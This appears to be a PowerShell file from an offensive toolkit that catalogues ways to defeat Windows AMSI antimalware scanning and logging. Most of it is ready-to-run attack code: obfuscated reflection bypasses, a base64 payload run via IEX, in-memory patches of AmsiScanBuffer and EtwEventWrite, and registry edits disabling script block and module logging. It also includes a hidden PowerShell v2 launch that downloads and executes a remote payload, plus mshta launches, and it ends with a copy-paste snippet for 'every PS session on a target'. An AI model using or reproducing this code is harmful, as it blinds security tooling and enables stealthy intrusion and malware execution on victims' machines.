# ============================================================
# AMSI Bypass — Comprehensive Method Reference
# ============================================================
# This file documents every AMSI bypass method worth knowing.
# Use the existing ps-amsi-bypass.ps1 for the 3 reflection
# methods (amsiInitFailed, amsiContext, amsiSession).
#
# This file covers: memory patching, ETW, downgrade, registry,
# logging disables, string split tricks, and more.
#
# DECISION GUIDE — pick based on your situation:
#   - In a PS session, need quick bypass    → Method 1 (amsiInitFailed) from ps-amsi-bypass.ps1
#   - String "amsiInitFailed" is flagged    → Method 2-4 below (split strings, chars)
#   - Need to also blind ETW logging        → Method 5 (ETW patch)
#   - Need to bypass for JScript/VBScript   → Method 6 (registry)
#   - Old box, .NET 2.0 installed           → Method 7 (PS v2 downgrade)
#   - Want to disable script block logging  → Method 8
#   - In C# loader, need in-process bypass  → see csharp-amsi-bypass.cs
# ============================================================


# ============================================================
# METHOD 1: String-split trick (Nishang-style) — avoids signature
# ============================================================
# The string "amsiInitFailed" is signatured. Split it so no
# scanner sees the full string in one buffer.
#
# Concatenation approach:
$a = [Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils')
$b = $a.GetField('amsiInit'+'Failed','NonPublic,Static')
$b.SetValue($null,$true)

# Char array approach (least signatured):
# Builds "AmsiUtils" from char codes — no string literals at all
$s = [char[]](65,109,115,105,85,116,105,108,115) -join ''
$t = [char[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100) -join ''
$a = [Ref].Assembly.GetType("System.Management.Automation.$s")
$b = $a.GetField($t,'NonPublic,Static')
$b.SetValue($null,$true)


# ============================================================
# METHOD 2: Variable-split obfuscation (harder to regex-match)
# ============================================================
$x='System.Management.Automation'
$y='AmsiUtils'
$z='amsiInitFailed'
([Ref].Assembly.GetType("$x.$y").GetField($z,'NonPublic,Static')).SetValue($null,$true)


# ============================================================
# METHOD 3: Base64 + IEX (classic obfuscation layer)
# ============================================================
# Encode the bypass command in base64 so the plain string
# never appears in script block logging as a recognizable pattern.
#
# Generate the base64 on Kali:
#   python3 -c "import base64; print(base64.b64encode(b'([Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiInitFailed\",\"NonPublic,Static\")).SetValue(\$null,\$true)'.encode('utf-16-le')).decode())"
#
# Run on victim (replace <BASE64> with actual encoded string):
# powershell -enc <BASE64>
#
# Or from within a PS session:
$e = [System.Convert]::FromBase64String('KABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAIgBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQBVAHQAaQBsAHMAIgApAC4ARwBlAHQARgBpAGUAbABkACgAIgBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAIgAsACIATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAiACkAKQAuAFMAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAAsACQAdAByAHUAZQApAA==')
IEX ([System.Text.Encoding]::Unicode.GetString($e))


# ============================================================
# METHOD 4: AmsiScanBuffer memory patch (PowerShell, no C# needed)
# ============================================================
# Patches the AmsiScanBuffer function in amsi.dll directly in
# memory to return AMSI_RESULT_CLEAN (1) immediately.
# This is more robust than field reflection — works even if
# Microsoft patches the reflection vector.
#
# HOW IT WORKS:
#   1. Load amsi.dll into the current process
#   2. Find the AmsiScanBuffer function address
#   3. Change memory protection to writable
#   4. Write a ret/clean instruction that skips scanning
#   5. Restore memory protection
#
# x64 patch bytes: B8 57 00 07 80 C3
#   B8 57000780 = MOV EAX, 0x80070057 (E_INVALIDARG)
#   C3          = RET
#   AMSI sees E_INVALIDARG and treats the result as clean.

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class AmsiPatch {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint f, out uint o);

    public static void Patch() {
        var lib = LoadLibrary("am" + "si.dll");
        var addr = GetProcAddress(lib, "Amsi" + "Scan" + "Buffer");
        uint old;
        var patch = (IntPtr.Size == 8)
            ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }     // x64
            : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };  // x86
        VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out old);
        Marshal.Copy(patch, 0, addr, patch.Length);
        VirtualProtect(addr, (UIntPtr)patch.Length, old, out old);
    }
}
"@
[AmsiPatch]::Patch()


# ============================================================
# METHOD 5: ETW (Event Tracing for Windows) patch
# ============================================================
# ETW is separate from AMSI. Even if you bypass AMSI, ETW
# can still log your PowerShell commands to event logs.
# This patches ntdll!EtwEventWrite to return immediately.
#
# IMPORTANT: Run this AFTER AMSI bypass, as Add-Type itself
# may get scanned. Or use the Invoke-SharpLoader.ps1 which
# includes a compiled ETW patcher.
#
# Note: The Invoke-BlockETW function inside Invoke-SharpLoader.ps1
# (03-loaders/reflective/) does this via a precompiled assembly.
# Use that in production — it's harder to detect.

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class EtwPatch {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint f, out uint o);

    public static void Patch() {
        var lib = LoadLibrary("ntdll.dll");
        var addr = GetProcAddress(lib, "EtwEvent" + "Write");
        uint old;
        // Patch: C3 = RET (return immediately, log nothing)
        var patch = new byte[] { 0xC3 };
        VirtualProtect(addr, (UIntPtr)1, 0x40, out old);
        Marshal.Copy(patch, 0, addr, patch.Length);
        VirtualProtect(addr, (UIntPtr)1, old, out old);
    }
}
"@
[EtwPatch]::Patch()


# ============================================================
# METHOD 6: PowerShell v2 downgrade (if .NET 2.0 is present)
# ============================================================
# PS v2 was released before AMSI existed — it has zero AMSI
# integration. Simply launching PS v2 gives you a fully
# unrestricted environment.
#
# Check if v2 is available:
#   Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root
#   or: powershell -Version 2 -Command "$PSVersionTable"
#
# Use:
#   powershell -Version 2 -exec bypass -c "<command>"
#   powershell -Version 2 -exec bypass -f payload.ps1
#
# Requires .NET 2.0 — common on older systems, sometimes present on newer ones.
# Will fail with: "The term 'powershell' ... Windows PowerShell 2.0 is not supported"
# if .NET 2.0 isn't installed.
#
# From within a session, you can't "downgrade" — you must spawn a new process:

Start-Process powershell -ArgumentList '-Version 2 -exec bypass -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(''http://KALI/payload.ps1'')"' -WindowStyle Hidden


# ============================================================
# METHOD 7: Disable Script Block Logging (registry, needs admin)
# ============================================================
# Script block logging records PS commands to Event ID 4104.
# This disables it for the entire machine (persists across sessions).
# Requires admin.

Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
    -Name "EnableScriptBlockLogging" -Value 0 -Type DWord -Force

# Verify:
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"


# ============================================================
# METHOD 8: Disable Module Logging (registry, needs admin)
# ============================================================
# Module logging records all PS commands including pipeline input.
# More verbose than script block logging. Disable both for full silence.

Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" `
    -Name "EnableModuleLogging" -Value 0 -Type DWord -Force


# ============================================================
# METHOD 9: Registry disable for JScript / VBScript AMSI
# ============================================================
# AMSI also applies to Windows Script Host (JScript, VBScript).
# Setting AmsiEnable = 0 in HKCU disables it for the current user.
# NO ADMIN NEEDED — HKCU is always writable.
#
# Use when your payload is a .js, .vbs, or .hta file.

$path = "HKCU:\Software\Microsoft\Windows Script\Settings"
if (-not (Test-Path $path)) { New-Item -Path $path -Force | Out-Null }
Set-ItemProperty -Path $path -Name "AmsiEnable" -Value 0 -Type DWord -Force

# Verify:
Get-ItemProperty "HKCU:\Software\Microsoft\Windows Script\Settings"


# ============================================================
# METHOD 10: COM object / WScript.Shell execution bypass
# ============================================================
# Spawning code via COM object (WScript.Shell, Excel macros, etc.)
# may not have AMSI applied depending on the host process.
# This is not a direct bypass but an alternative execution path.
#
# From PowerShell, create a WScript.Shell and run JScript:
$shell = New-Object -ComObject WScript.Shell
$shell.Run("wscript //nologo C:\Windows\Temp\payload.js", 0, $false)

# Or spawn mshta (AMSI not always present in mshta context):
$shell.Run('mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -enc BASE64"",0:close")', 0, $false)


# ============================================================
# METHOD 11: Constrained Language Mode bypass check
# ============================================================
# CLM restricts PS — prevents Add-Type, custom .NET, etc.
# AMSI bypass methods 1-3 still work in CLM (pure reflection).
# Methods 4-5 (Add-Type) require Full Language Mode.
#
# Check current mode:
$ExecutionContext.SessionState.LanguageMode
# FullLanguage = unrestricted
# ConstrainedLanguage = restricted (see 01-evasion/clm-bypass/)


# ============================================================
# QUICK REFERENCE — copy-paste ready (most portable)
# ============================================================

# Paste this at the start of every PS session on a target:

# 1. Reflection bypass (works in CLM, no Add-Type needed)
(([Ref].Assembly.gettypes()|?{$_.Name-like'Amsi*utils'}).GetFields('NonPublic,Static')|?{$_.Name-like'amsiInit*ailed'}).SetValue($null,$true)

# 2. Verify it worked (should return True):
# ([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')).GetValue($null)
